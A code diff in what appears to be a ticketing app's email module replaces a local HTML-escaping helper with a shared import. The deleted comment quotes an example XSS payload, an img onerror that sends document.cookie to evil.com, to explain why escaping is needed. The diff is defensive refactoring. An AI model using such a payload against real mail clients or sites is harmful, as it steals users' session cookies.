@@ -1,20 +1,4 @@
-/**
- * escapeHtml — sanitise every user-controlled string before embedding it in an
- * HTML email body.  Without this, a ticket title like
- *   <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
- * would be rendered by the recipient's email client and execute the payload.
- *
- * This is the same helper used in automationEngine.ts and sla-check/route.ts.
- * It lives here too so email.ts has zero external dependencies for sanitisation.
- */
-function escapeHtml(str: string): string {
-    return String(str)
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;")
-      .replace(/'/g, "&#x27;");
-}
+import { escapeHtml } from "@/lib/utils";
 
 async function sendEmail(to: string, subject: string, html: string) {
     const apiKey = process.env.BREVO_API_KEY;
